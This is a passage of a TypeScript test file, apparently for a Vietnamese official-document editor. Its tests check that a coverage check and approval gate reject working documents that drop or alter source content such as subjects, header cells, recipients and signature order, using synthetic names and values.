      body: { html: "<p>Nội dung văn bản.</p>", sourceBlockIds: ["b_body"] },
    } as any,
  }, { blobHash: "hash-stale-structured-import", generation: 1 });

  const coverage = buildSourceToWorkspaceCoverage(snapshot);
  assert.equal(coverage.isFullyCovered, false, "Working field rỗng không được dùng structuredImport cũ để che đậy");
  assert.equal(approveWorkspacePartition(snapshot).ok, false, "Approval phải fail khi working field rỗng");
});

test("Task 2: Separator thứ hai trong Body vắng mặt không được tự công nhận vì có subject", async () => {
  const blocks: SourceBlock[] = [
    { id: "b_subj", index: 0, kind: "paragraph", role: "metadata", text: "Về việc tổ chức hội thao" },
    { id: "b_sep1", index: 1, kind: "paragraph", role: "separator", text: "-----" },
    { id: "b_p1", index: 2, kind: "paragraph", role: "body", text: "Đoạn 1 thân bài." },
    { id: "b_sep2", index: 3, kind: "paragraph", role: "separator", text: "-----" }, // Dấu thứ hai trong thân bài
    { id: "b_p2", index: 4, kind: "paragraph", role: "body", text: "Đoạn 2 thân bài." },
  ];

  // Working doc has subject, but bodyHtml does NOT contain the second separator
  const snapshot = createWorkspaceSnapshot({
    doc: makeDoc({
      subject: "Về việc tổ chức hội thao",
      bodyHtml: "<p>Đoạn 1 thân bài.</p><p>Đoạn 2 thân bài.</p>", // Không có "-----"
    }),
    standardType: "state",
    reviewBlocks: blocks,
    structuredImport: null,
  }, { blobHash: "hash-orphan-second-separator", generation: 1 });

  const coverage = buildSourceToWorkspaceCoverage(snapshot);
  assert.equal(coverage.isFullyCovered, false, "Separator thứ hai không có trong bodyHtml không được tự công nhận");
  assert.equal(approveWorkspacePartition(snapshot).ok, false, "Approval phải fail khi separator nguồn không có đích thực tế");
});

test("B1-R1: Metadata bị cắt một phần phải bị từ chối dù đích vẫn còn chữ", () => {
  const blocks: SourceBlock[] = [
    { id: "b_subject", index: 0, kind: "paragraph", role: "metadata", text: "ALPHA LONG SUBJECT" },
    { id: "b_body", index: 1, kind: "paragraph", role: "body", text: "BODY TEXT" },
  ];
  const incomplete = createWorkspaceSnapshot({
    doc: makeDoc({ subject: "ALPHA", bodyHtml: "<p>BODY TEXT</p>" }),
    standardType: "state",
    reviewBlocks: blocks,
    structuredImport: null,
  }, { blobHash: "hash-metadata-truncated", generation: 1 });

  assert.equal(buildSourceToWorkspaceCoverage(incomplete).isFullyCovered, false, "Không được dùng một phần trích yếu làm bằng chứng cho toàn câu nguồn");
  assert.equal(approveWorkspacePartition(incomplete).ok, false, "B1 không được duyệt metadata bị cắt");

  const complete = createWorkspaceSnapshot({
    doc: makeDoc({ subject: "ALPHA LONG SUBJECT", bodyHtml: "<p>BODY TEXT</p>" }),
    standardType: "state",
    reviewBlocks: blocks,
    structuredImport: null,
  }, { blobHash: "hash-metadata-complete", generation: 1 });
  assert.equal(approveWorkspacePartition(complete).ok, true, "Metadata được giữ đầy đủ vẫn phải duyệt được");
});

test("B1-R2: Ô bảng phần đầu sai nội dung hoặc thiếu tiêu ngữ phải bị từ chối", () => {
  const header = makeSourceTableBlock("b_header", 0, "header", [
    { cellId: "org", text: "CÔNG TY ALPHA" },
    { cellId: "national", text: "CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM\nĐộc lập - Tự do - Hạnh phúc" },
  ]);
  const body: SourceBlock = { id: "b_body", index: 1, kind: "paragraph", role: "body", text: "BODY TEXT" };
  const blocks = [header, body];
  const incomplete = createWorkspaceSnapshot({
    doc: makeDoc({
      orgHeader2: "CÔNG TY UNRELATED",
      nationalHeader1: "UNRELATED NATIONAL",
      nationalHeader2: "",
      bodyHtml: "<p>BODY TEXT</p>",
    }),
    standardType: "state",
    reviewBlocks: blocks,
    structuredImport: null,
  }, { blobHash: "hash-header-mismatch", generation: 1 });

  assert.equal(buildSourceToWorkspaceCoverage(incomplete).isFullyCovered, false, "Mapping vai trò không thay thế bằng chứng nội dung từng ô");
  assert.equal(approveWorkspacePartition(incomplete).ok, false, "B1 không được duyệt ô cơ quan/quốc hiệu sai và tiêu ngữ bị mất");

  const mapped = structuredClone(incomplete);
  mapped.workspace.partition = makePartition(mapped.workspace.source, "state", mapped.reviewBlocks, mapped.workspace.partition.revision, [
    { sourceBlockId: "b_header", cellId: "org", role: "header" },
    { sourceBlockId: "b_header", cellId: "national", role: "header" },
  ]);
  assert.equal(buildSourceToWorkspaceCoverage(mapped).isFullyCovered, false, "CellRoleMapping chỉ xác nhận vai trò, không được bỏ qua đối chiếu giá trị");
  assert.equal(approveWorkspacePartition(mapped).ok, false, "CellRoleMapping không được mở cổng duyệt khi nội dung sai");

  const missingModelBlocks = [{ ...header, tableModel: undefined }, body];
  const missingModel = createWorkspaceSnapshot({
    doc: makeDoc({
      orgHeader2: "CÔNG TY ALPHA",
      nationalHeader1: "CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM",
      nationalHeader2: "Độc lập - Tự do - Hạnh phúc",
      bodyHtml: "<p>BODY TEXT</p>",
    }),
    standardType: "state",
    reviewBlocks: missingModelBlocks,
    structuredImport: null,
  }, { blobHash: "hash-header-no-model", generation: 1 });
  assert.equal(buildSourceToWorkspaceCoverage(missingModel).isFullyCovered, false, "Bảng nguồn thiếu TableModel phải giữ trạng thái chưa xác minh");
  assert.equal(approveWorkspacePartition(missingModel).ok, false, "Không được duyệt bảng đầu khi không có bằng chứng cấu trúc ô");

  const complete = createWorkspaceSnapshot({
    doc: makeDoc({
      orgHeader2: "CÔNG TY ALPHA",
      nationalHeader1: "CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM",
      nationalHeader2: "Độc lập - Tự do - Hạnh phúc",
      bodyHtml: "<p>BODY TEXT</p>",
    }),
    standardType: "state",
    reviewBlocks: blocks,
    structuredImport: null,
  }, { blobHash: "hash-header-complete", generation: 1 });
  assert.equal(approveWorkspacePartition(complete).ok, true, "Các ô đầu văn bản được giữ đầy đủ vẫn phải duyệt được");
});

test("B1-R3: Bảng cuối thiếu một dòng nơi nhận phải bị từ chối", () => {
  const footer = makeSourceTableBlock("b_footer", 0, "signature", [
    { cellId: "recipients", text: "Nơi nhận:\n- UNIT A;\n- UNIT B;" },
    { cellId: "sign", text: "GIÁM ĐỐC\nSYNTHETIC PERSON" },
  ]);
  const body: SourceBlock = { id: "b_body", index: 1, kind: "paragraph", role: "body", text: "BODY TEXT" };
  const blocks = [footer, body];
  const incomplete = createWorkspaceSnapshot({
    doc: makeDoc({
      recipients: "- UNIT A;",
      signTitle: "GIÁM ĐỐC",
      signName: "SYNTHETIC PERSON",
      bodyHtml: "<p>BODY TEXT</p>",
    }),
    standardType: "state",
    reviewBlocks: blocks,
    structuredImport: null,
  }, { blobHash: "hash-footer-partial-recipients", generation: 1 });

  assert.equal(buildSourceToWorkspaceCoverage(incomplete).isFullyCovered, false, "Một dòng nơi nhận còn lại không đại diện cho toàn bộ ô nguồn");
  assert.equal(approveWorkspacePartition(incomplete).ok, false, "B1 không được duyệt khi thiếu UNIT B");

  const complete = createWorkspaceSnapshot({
    doc: makeDoc({
      recipients: "- UNIT A;\n- UNIT B;",
      signTitle: "GIÁM ĐỐC",
      signName: "SYNTHETIC PERSON",
      bodyHtml: "<p>BODY TEXT</p>",
    }),
    standardType: "state",
    reviewBlocks: blocks,
    structuredImport: null,
  }, { blobHash: "hash-footer-complete-recipients", generation: 1 });
  assert.equal(approveWorkspacePartition(complete).ok, true, "Nơi nhận và chữ ký được giữ đầy đủ vẫn phải duyệt được");

  const wrongSigner = createWorkspaceSnapshot({
    doc: makeDoc({
      recipients: "- UNIT A;\n- UNIT B;",
      signTitle: "GIÁM ĐỐC",
      signName: "UNRELATED PERSON",
      bodyHtml: "<p>BODY TEXT</p>",
    }),
    standardType: "state",
    reviewBlocks: blocks,
    structuredImport: null,
  }, { blobHash: "hash-footer-wrong-signer", generation: 1 });
  assert.equal(buildSourceToWorkspaceCoverage(wrongSigner).isFullyCovered, false, "Giữ nơi nhận không được che việc đổi tên người ký không có giao dịch");
  assert.equal(approveWorkspacePartition(wrongSigner).ok, false, "B1 không được duyệt người ký khác nội dung nguồn");
});

test("B1-R4: Ánh xạ chữ ký phải giữ đúng thứ tự và số lần xuất hiện", () => {
  const makeFooter = (signatureText: string) => makeSourceTableBlock("b_footer", 0, "signature", [
    { cellId: "recipients", text: "Nơi nhận:\n- UNIT A;" },
    { cellId: "sign", text: signatureText },
  ]);
  const makeSnapshot = (signatureText: string, signTitle: string, signName: string, hash: string) => {
    const blocks = [
      makeFooter(signatureText),
      { id: "b_body", index: 1, kind: "paragraph" as const, role: "body" as const, text: "BODY TEXT" },
    ];
    return createWorkspaceSnapshot({
      doc: makeDoc({ recipients: "- UNIT A;", signTitle, signName, bodyHtml: "<p>BODY TEXT</p>" }),
      standardType: "state",
      reviewBlocks: blocks,
      structuredImport: null,
    }, { blobHash: hash, generation: 1 });
  };

  const correct = makeSnapshot("GIÁM ĐỐC\nSYNTHETIC PERSON", "GIÁM ĐỐC", "SYNTHETIC PERSON", "hash-sign-order-correct");
  assert.equal(buildSourceToWorkspaceCoverage(correct).isFullyCovered, true, "Chức danh rồi đến người ký phải được giữ nguyên");
  assert.equal(approveWorkspacePartition(correct).ok, true, "Ánh xạ chữ ký hợp lệ vẫn phải cho phép duyệt B1");

  const swapped = makeSnapshot("GIÁM ĐỐC\nSYNTHETIC PERSON", "SYNTHETIC PERSON", "GIÁM ĐỐC", "hash-sign-order-swapped");
  assert.equal(buildSourceToWorkspaceCoverage(swapped).isFullyCovered, false, "Không được duyệt khi chức danh và người ký bị đảo vai trò");
  assert.equal(approveWorkspacePartition(swapped).ok, false, "Cổng B1 phải từ chối chữ ký bị đảo vai trò");

  const splitCellFooter = makeSourceTableBlock("b_split_sign_footer", 0, "signature", [
    { cellId: "recipients", text: "Nơi nhận:\n- UNIT A;" },
    { cellId: "sign_name_first", text: "SYNTHETIC PERSON" },
    { cellId: "sign_title_second", text: "GIÁM ĐỐC" },
  ]);
  const splitCellSnapshot = createWorkspaceSnapshot({
    doc: makeDoc({ recipients: "- UNIT A;", signTitle: "GIÁM ĐỐC", signName: "SYNTHETIC PERSON", bodyHtml: "<p>BODY TEXT</p>" }),
    standardType: "state",
    reviewBlocks: [splitCellFooter, { id: "b_split_sign_body", index: 1, kind: "paragraph", role: "body", text: "BODY TEXT" }],
    structuredImport: null,
  }, { blobHash: "hash-sign-order-swapped-cells", generation: 1 });
  assert.equal(buildSourceToWorkspaceCoverage(splitCellSnapshot).isFullyCovered, false, "Không được xét từng ô riêng lẻ để bỏ qua thứ tự chức danh và tên giữa các ô");
  assert.equal(approveWorkspacePartition(splitCellSnapshot).ok, false, "Cổng B1 phải từ chối các ô chữ ký sai thứ tự");

  const duplicated = makeSnapshot("GIÁM ĐỐC\nGIÁM ĐỐC\nSYNTHETIC PERSON", "GIÁM ĐỐC", "SYNTHETIC PERSON", "hash-sign-order-duplicate");
  assert.equal(buildSourceToWorkspaceCoverage(duplicated).isFullyCovered, false, "Một trường đích không được che dòng chức danh bị lặp trong nguồn");
  assert.equal(approveWorkspacePartition(duplicated).ok, false, "Cổng B1 phải từ chối dòng chữ ký bị nhân đôi");
});

test("B1-R5: Ánh xạ nhiều người ký giữ cặp chức danh và họ tên", () => {
  const footer = makeSourceTableBlock("b_multi_sign_footer", 0, "signature", [
    { cellId: "recipients", text: "Nơi nhận:\n- UNIT A;" },
    { cellId: "signers", text: "CHỦ TRÌ\nSYNTHETIC PERSON A\nTHƯ KÝ\nSYNTHETIC PERSON B" },
  ]);
  const body: SourceBlock = { id: "b_multi_sign_body", index: 1, kind: "paragraph", role: "body", text: "BODY TEXT" };
  const snapshot = createWorkspaceSnapshot({
    doc: makeDoc({
      recipients: "- UNIT A;",
      signTitle: "CHỦ TRÌ | THƯ KÝ",
      signName: "SYNTHETIC PERSON A | SYNTHETIC PERSON B",
      bodyHtml: "<p>BODY TEXT</p>",
    }),
    standardType: "state",
    reviewBlocks: [footer, body],
    structuredImport: null,
  }, { blobHash: "hash-multi-sign-order-correct", generation: 1 });

  assert.equal(buildSourceToWorkspaceCoverage(snapshot).isFullyCovered, true, "Cặp nhiều người ký được giữ đúng thứ tự phải được bao phủ");
  assert.equal(approveWorkspacePartition(snapshot).ok, true, "Cổng B1 phải chấp nhận nhiều người ký được giữ đúng cặp");
});
